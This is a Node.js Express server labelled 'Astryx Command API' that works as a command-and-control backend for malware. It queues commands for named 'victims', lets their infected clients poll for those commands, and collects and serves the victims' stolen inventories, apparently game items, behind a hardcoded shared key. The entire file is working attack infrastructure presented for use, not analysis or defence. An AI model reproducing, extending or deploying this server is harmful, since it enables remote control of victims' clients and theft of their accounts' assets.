const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

const COMMAND_KEY = 'moziu-super-secret';
const commandQueue = new Map();
const inventoryCache = new Map(); // Store victim inventories

app.get('/', (req, res) => {
    res.json({ status: 'Astryx Command API Running' });
});

// Existing command endpoints
app.post('/api/send-command', (req, res) => {
    const { victim, key, command, timestamp } = req.body;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    if (!victim || !command) {
        return res.status(400).json({ error: 'Missing victim or command' });
    }
    
    commandQueue.set(victim.toLowerCase(), {
        command,
        timestamp,
        received: Date.now()
    });
    
    console.log(`[Astryx CMD] ${victim}: ${command}`);
    res.json({ ok: true, queued: true });
});

app.get('/api/get-command', (req, res) => {
    const { user, key } = req.query;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    const victimKey = user.toLowerCase();
    const cmd = commandQueue.get(victimKey);
    
    if (cmd) {
        commandQueue.delete(victimKey);
        return res.json({ ok: true, cmd: cmd.command, ts: cmd.timestamp });
    }
    
    res.json({ ok: true, cmd: null });
});

// NEW: Inventory endpoints for Fruits tab
app.post('/api/update-inventory', (req, res) => {
    const { victim, key, inventory } = req.body;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    if (!victim || !inventory) {
        return res.status(400).json({ error: 'Missing victim or inventory' });
    }
    
    inventoryCache.set(victim.toLowerCase(), {
        inventory: inventory,
        updated: Date.now()
    });
    
    res.json({ ok: true });
});

app.get('/api/get-inventory', (req, res) => {
    const { victim, key } = req.query;
    
    if (key !== COMMAND_KEY) {
        return res.status(403).json({ error: 'Invalid key' });
    }
    
    const data = inventoryCache.get(victim.toLowerCase());
    
    if (data) {
        return res.json({ ok: true, inventory: data.inventory, updated: data.updated });
    }
    
    res.json({ ok: true, inventory: [] });
});

// Cleanup old data
setInterval(() => {
    const now = Date.now();
    for (const [victim, data] of commandQueue) {
        if (now - data.received > 30000) {
            commandQueue.delete(victim);
        }
    }
    for (const [victim, data] of inventoryCache) {
        if (now - data.updated > 60000) { // 1 minute timeout for inventory
            inventoryCache.delete(victim);
        }
    }
}, 10000);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Astryx Server running on port ${PORT}`);
});
